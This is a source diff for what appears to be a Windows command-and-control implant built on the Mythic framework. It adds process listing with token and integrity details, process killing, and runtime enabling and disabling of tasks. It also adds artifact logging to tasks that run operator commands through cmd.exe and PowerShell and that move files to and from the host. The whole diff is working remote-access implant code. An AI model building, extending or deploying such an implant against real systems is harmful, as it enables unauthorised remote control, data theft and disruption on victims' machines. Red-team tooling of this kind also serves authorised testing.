@@ -4,6 +4,7 @@
 #include "mythic.h"
 #include "tasks.h"
 #include <stdarg.h>
+#include <tlhelp32.h>
 
 #define XFER_CHUNK_DEFAULT 512000
 #define XFER_CHUNK_SMALL 8192
@@ -310,10 +311,21 @@ static cJSON *ls_browser(const char *dir, const char *abs) {
 
 typedef int (*task_fn_t)(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now);
 
+static int set_command_allowed(const char *name, int allowed);
+static int protected_runtime(const char *name);
+static char *artifacts_fragment(const char *base, const char *artifact);
+
 static int task_shell(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
     int code = 0;
+    char *full;
     (void)a;
     (void)exit_now;
+    full = (char *)malloc(strlen(arg) + 16);
+    if (full) {
+        snprintf(full, strlen(arg) + 16, "cmd.exe /c %s", arg);
+        resp->extra_json = artifacts_fragment("Process Create", full);
+        free(full);
+    }
     *output = run_capture("cmd.exe", arg, &code);
     if (!*output) {
         resp->status = "error: exec failed";
@@ -327,8 +339,15 @@ static int task_shell(agent_t *a, const char *arg, response_t *resp, char **outp
 
 static int task_powershell(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
     int code = 0;
+    char *full;
     (void)a;
     (void)exit_now;
+    full = (char *)malloc(strlen(arg) + 24);
+    if (full) {
+        snprintf(full, strlen(arg) + 24, "powershell.exe /c %s", arg);
+        resp->extra_json = artifacts_fragment("Process Create", full);
+        free(full);
+    }
     *output = run_capture("powershell.exe", arg, &code);
     if (!*output) {
         resp->status = "error: exec failed";
@@ -509,6 +528,7 @@ static int task_download(agent_t *a, const char *arg, response_t *resp, char **o
             return failf(resp, output, "error: out of memory");
         snprintf(*output, 512, "downloaded %s (0 bytes)", arg);
         resp->user_output = *output;
+        resp->extra_json = artifacts_fragment("File Download", arg);
         return 0;
     }
     buf = (unsigned char *)malloc((size_t)chunk_size);
@@ -572,6 +592,7 @@ static int task_download(agent_t *a, const char *arg, response_t *resp, char **o
         return failf(resp, output, "error: out of memory");
     snprintf(*output, 512, "downloaded %s (%I64d bytes in %d chunks)", arg, sz.QuadPart, total);
     resp->user_output = *output;
+    resp->extra_json = artifacts_fragment("File Download", arg);
     return 0;
 }
 
@@ -657,6 +678,7 @@ static int task_upload(agent_t *a, const char *arg, response_t *resp, char **out
         return failf(resp, output, "error: out of memory");
     snprintf(*output, 512, "uploaded %s (%I64d bytes in %d chunks)", remote, written, total);
     resp->user_output = *output;
+    resp->extra_json = artifacts_fragment("File Upload", remote);
     return 0;
 }
 
@@ -750,6 +772,19 @@ static int task_rm(agent_t *a, const char *arg, response_t *resp, char **output,
     cJSON_AddStringToObject(one, "path", full);
     cJSON_AddItemToArray(arr, one);
     cJSON_AddItemToObject(wrap, "removed_files", arr);
+    {
+        cJSON *artarr = cJSON_CreateArray();
+        cJSON *artone = cJSON_CreateObject();
+        if (artarr && artone) {
+            cJSON_AddStringToObject(artone, "base_artifact", "File Delete");
+            cJSON_AddStringToObject(artone, "artifact", full);
+            cJSON_AddItemToArray(artarr, artone);
+            cJSON_AddItemToObject(wrap, "artifacts", artarr);
+        } else {
+            cJSON_Delete(artarr);
+            cJSON_Delete(artone);
+        }
+    }
     resp->extra_json = cJSON_PrintUnformatted(wrap);
     cJSON_Delete(wrap);
     *output = (char *)malloc(512);
@@ -773,6 +808,225 @@ static int task_mkdir(agent_t *a, const char *arg, response_t *resp, char **outp
     snprintf(*output, 512, "created %s", arg);
     resp->user_output = *output;
     return 0;
+}
+
+/* Best-effort owner + integrity level for a process handle. */
+static void proc_token_info(HANDLE hProc, char *user, size_t ucap, int *integrity) {
+    HANDLE tok = NULL;
+    DWORD need = 0;
+    TOKEN_USER *tu = NULL;
+    TOKEN_MANDATORY_LABEL *tml = NULL;
+    user[0] = '\0';
+    *integrity = 0;
+    if (!OpenProcessToken(hProc, TOKEN_QUERY, &tok))
+        return;
+    GetTokenInformation(tok, TokenUser, NULL, 0, &need);
+    if (need > 0 && need < 65536) {
+        tu = (TOKEN_USER *)malloc(need);
+        if (tu && GetTokenInformation(tok, TokenUser, tu, need, &need)) {
+            char name[128], dom[128];
+            DWORD nlen = sizeof(name), dlen = sizeof(dom);
+            SID_NAME_USE use;
+            if (LookupAccountSidA(NULL, tu->User.Sid, name, &nlen, dom, &dlen, &use))
+                snprintf(user, ucap, "%s\\%s", dom, name);
+        }
+        free(tu);
+    }
+    need = 0;
+    GetTokenInformation(tok, TokenIntegrityLevel, NULL, 0, &need);
+    if (need > 0 && need < 65536) {
+        tml = (TOKEN_MANDATORY_LABEL *)malloc(need);
+        if (tml && GetTokenInformation(tok, TokenIntegrityLevel, tml, need, &need)) {
+            DWORD nsub = *GetSidSubAuthorityCount(tml->Label.Sid);
+            if (nsub > 0)
+                *integrity = (int)*GetSidSubAuthority(tml->Label.Sid, nsub - 1);
+        }
+        free(tml);
+    }
+    CloseHandle(tok);
+}
+
+static const char *proc_arch(HANDLE hProc, int os64) {
+    BOOL wow = FALSE;
+    if (!os64)
+        return "x86";
+    if (IsWow64Process(hProc, &wow) && wow)
+        return "x86";
+    return "x64";
+}
+
+static int task_ps(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
+    HANDLE snap;
+    PROCESSENTRY32 pe;
+    SYSTEM_INFO si;
+    cJSON *arr, *wrap;
+    char *text = NULL;
+    size_t len = 0, cap = 0;
+    int os64;
+    (void)a;
+    (void)arg;
+    (void)exit_now;
+    GetNativeSystemInfo(&si);
+    os64 = si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64;
+    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE)
+        return failf(resp, output, "error: snapshot failed");
+    arr = cJSON_CreateArray();
+    wrap = cJSON_CreateObject();
+    text = (char *)malloc(4096);
+    if (!arr || !wrap || !text) {
+        CloseHandle(snap);
+        cJSON_Delete(arr);
+        cJSON_Delete(wrap);
+        free(text);
+        return failf(resp, output, "error: out of memory");
+    }
+    cap = 4096;
+    text[0] = '\0';
+    pe.dwSize = sizeof(pe);
+    if (Process32First(snap, &pe)) {
+        do {
+            cJSON *row = cJSON_CreateObject();
+            HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
+            char bin[MAX_PATH], user[256];
+            DWORD binlen = sizeof(bin);
+            int integrity = 0;
+            unsigned long long start = 0;
+            bin[0] = '\0';
+            if (h) {
+                FILETIME ct, et, kt, ut;
+                if (!QueryFullProcessImageNameA(h, 0, bin, &binlen))
+                    bin[0] = '\0';
+                proc_token_info(h, user, sizeof(user), &integrity);
+                if (GetProcessTimes(h, &ct, &et, &kt, &ut))
+                    start = filetime_to_unix(&ct);
+            } else {
+                user[0] = '\0';
+            }
+            if (row) {
+                cJSON_AddNumberToObject(row, "process_id", (double)pe.th32ProcessID);
+                cJSON_AddNumberToObject(row, "parent_process_id", (double)pe.th32ParentProcessID);
+                cJSON_AddStringToObject(row, "architecture", h ? proc_arch(h, os64) : "");
+                cJSON_AddStringToObject(row, "bin_path", bin);
+                cJSON_AddStringToObject(row, "name", pe.szExeFile);
+                cJSON_AddStringToObject(row, "user", user);
+                if (integrity)
+                    cJSON_AddNumberToObject(row, "integrity_level", (double)integrity);
+                if (start)
+                    cJSON_AddNumberToObject(row, "start_time", (double)start);
+                cJSON_AddItemToArray(arr, row);
+            }
+            if (h)
+                CloseHandle(h);
+            {
+                size_t n = strlen(pe.szExeFile) + 32;
+                if (len + n > cap) {
+                    char *grown = (char *)realloc(text, cap * 2);
+                    if (!grown)
+                        break;
+                    text = grown;
+                    cap *= 2;
+                }
+                len += (size_t)snprintf(text + len, cap - len, "%lu %lu %s\n",
+                                        (unsigned long)pe.th32ProcessID,
+                                        (unsigned long)pe.th32ParentProcessID, pe.szExeFile);
+            }
+        } while (Process32Next(snap, &pe));
+    }
+    CloseHandle(snap);
+    cJSON_AddItemToObject(wrap, "processes", arr);
+    resp->extra_json = cJSON_PrintUnformatted(wrap);
+    cJSON_Delete(wrap);
+    *output = text;
+    resp->user_output = *output;
+    return 0;
+}
+
+static int task_kill(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
+    char *end = NULL;
+    long pid;
+    HANDLE h;
+    (void)a;
+    (void)exit_now;
+    if (!arg || *arg == '\0')
+        return failf(resp, output, "error: usage: kill <pid>");
+    pid = strtol(arg, &end, 10);
+    if (end == arg || pid <= 0 || pid > 99999999)
+        return failf(resp, output, "error: usage: kill <pid>");
+    while (*end == ' ' || *end == '\t')
+        end++;
+    if (*end != '\0')
+        return failf(resp, output, "error: usage: kill <pid>");
+    h = OpenProcess(PROCESS_TERMINATE, FALSE, (DWORD)pid);
+    if (!h)
+        return failf(resp, output, "error: cannot open %ld (%lu)", pid, (unsigned long)GetLastError());
+    if (!TerminateProcess(h, 1)) {
+        CloseHandle(h);
+        return failf(resp, output, "error: cannot kill %ld (%lu)", pid, (unsigned long)GetLastError());
+    }
+    CloseHandle(h);
+    *output = (char *)malloc(64);
+    if (!*output)
+        return failf(resp, output, "error: out of memory");
+    snprintf(*output, 64, "killed %ld", pid);
+    resp->user_output = *output;
+    {
+        char pidbuf[32];
+        snprintf(pidbuf, sizeof(pidbuf), "pid %ld", pid);
+        resp->extra_json = artifacts_fragment("Process Kill", pidbuf);
+    }
+    return 0;
+}
+
+static int task_load(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
+    (void)a;
+    (void)exit_now;
+    if (!arg || !*arg || !set_command_allowed(arg, 1))
+        return failf(resp, output, "error: unknown command %s", (arg && *arg) ? arg : "");
+    *output = (char *)malloc(128);
+    if (!*output)
+        return failf(resp, output, "error: out of memory");
+    snprintf(*output, 128, "loaded %.100s", arg);
+    resp->user_output = *output;
+    return 0;
+}
+
+static int task_unload(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
+    (void)a;
+    (void)exit_now;
+    if (!arg || !*arg)
+        return failf(resp, output, "error: unknown command ");
+    if (protected_runtime(arg))
+        return failf(resp, output, "error: cannot unload %s", arg);
+    if (!set_command_allowed(arg, 0))
+        return failf(resp, output, "error: unknown command %s", arg);
+    *output = (char *)malloc(128);
+    if (!*output)
+        return failf(resp, output, "error: out of memory");
+    snprintf(*output, 128, "unloaded %.100s", arg);
+    resp->user_output = *output;
+    return 0;
+}
+
+/* Build an {"artifacts":[{...}]} fragment (caller frees), or NULL. */
+static char *artifacts_fragment(const char *base, const char *artifact) {
+    cJSON *arr = cJSON_CreateArray();
+    cJSON *one = cJSON_CreateObject();
+    cJSON *wrap = cJSON_CreateObject();
+    char *out = NULL;
+    if (!arr || !one || !wrap) {
+        cJSON_Delete(arr);
+        cJSON_Delete(one);
+        cJSON_Delete(wrap);
+        return NULL;
+    }
+    cJSON_AddStringToObject(one, "base_artifact", base);
+    cJSON_AddStringToObject(one, "artifact", artifact);
+    cJSON_AddItemToArray(arr, one);
+    cJSON_AddItemToObject(wrap, "artifacts", arr);
+    out = cJSON_PrintUnformatted(wrap);
+    cJSON_Delete(wrap);
+    return out;
 }
 
 static int task_exit(agent_t *a, const char *arg, response_t *resp, char **output, int *exit_now) {
@@ -799,13 +1053,65 @@ static const struct {
     {"upload", task_upload},
     {"rm", task_rm},
     {"mkdir", task_mkdir},
+    {"ps", task_ps},
+    {"kill", task_kill},
+    {"load", task_load},
+    {"unload", task_unload},
     {"exit", task_exit},
 };
+
+#define TASK_TABLE_LEN (sizeof(task_table) / sizeof(task_table[0]))
+
+/* Runtime allowlist, seeded from the build-time list. load/unload flip
+ * entries; resyncs if the build list changes under it (tests). */
+static int allow_init = 0;
+static int allow_flags[32];
+_Static_assert(TASK_TABLE_LEN <= 32, "allowlist too small");
+static char allow_csv[1024];
+
+static void allow_sync(void) {
+    size_t i;
+    if (allow_init && strcmp(allow_csv, CFG_COMMANDS) == 0)
+        return;
+    strncpy(allow_csv, CFG_COMMANDS, sizeof(allow_csv) - 1);
+    allow_csv[sizeof(allow_csv) - 1] = '\0';
+    if (CFG_COMMANDS[0] == '\0') {
+        for (i = 0; i < TASK_TABLE_LEN; i++)
+            allow_flags[i] = 1;
+    } else {
+        for (i = 0; i < TASK_TABLE_LEN; i++)
+            allow_flags[i] = command_in_list(CFG_COMMANDS, task_table[i].name);
+    }
+    allow_init = 1;
+}
+
+static int table_index(const char *name) {
+    size_t i;
+    for (i = 0; i < TASK_TABLE_LEN; i++) {
+        if (strcmp(name, task_table[i].name) == 0)
+            return (int)i;
+    }
+    return -1;
+}
+
+/* Flip one command at runtime; 0 when unknown. */
+static int set_command_allowed(const char *name, int allowed) {
+    int idx;
+    allow_sync();
+    idx = table_index(name);
+    if (idx < 0)
+        return 0;
+    allow_flags[idx] = allowed;
+    return 1;
+}
+
+static int protected_runtime(const char *name) {
+    return strcmp(name, "exit") == 0 || strcmp(name, "load") == 0 || strcmp(name, "unload") == 0;
+}
 
 int task_dispatch(agent_t *a, const task_t *t, response_t *resp, char **output, int *exit_now) {
     char scratch[8192];
     const char *arg;
-    size_t i;
     *output = NULL;
     *exit_now = 0;
     resp->task_id = t->id;
@@ -814,26 +1120,28 @@ int task_dispatch(agent_t *a, const task_t *t, response_t *resp, char **output, 
     resp->status = "success";
     resp->extra_json = NULL;
     arg = task_arg(t->parameters, scratch, sizeof(scratch));
-    for (i = 0; i < sizeof(task_table) / sizeof(task_table[0]); i++) {
-        if (strcmp(t->command, task_table[i].name) == 0) {
-            if (!command_in_list(CFG_COMMANDS, t->command)) {
-                *output = (char *)malloc(128);
-                if (*output) {
-                    snprintf(*output, 128, "error: command %.32s not included in this build",
-                             t->command);
-                    resp->status = *output;
-                } else {
-                    resp->status = "error: command not included in this build";
-                }
-                resp->user_output = resp->status;
-                return 0;
-            }
-            return task_table[i].fn(a, arg, resp, output, exit_now);
+    {
+        int idx = table_index(t->command);
+        if (idx < 0) {
+            resp->status = "error: unknown command";
+            resp->user_output = resp->status;
+            return 0;
         }
+        allow_sync();
+        if (!allow_flags[idx]) {
+            *output = (char *)malloc(128);
+            if (*output) {
+                snprintf(*output, 128, "error: command %.32s not included in this build",
+                         t->command);
+                resp->status = *output;
+            } else {
+                resp->status = "error: command not included in this build";
+            }
+            resp->user_output = resp->status;
+            return 0;
+        }
+        return task_table[idx].fn(a, arg, resp, output, exit_now);
     }
-    resp->status = "error: unknown command";
-    resp->user_output = resp->status;
-    return 0;
 }
 
 void task_sleep(int interval, int jitter) {
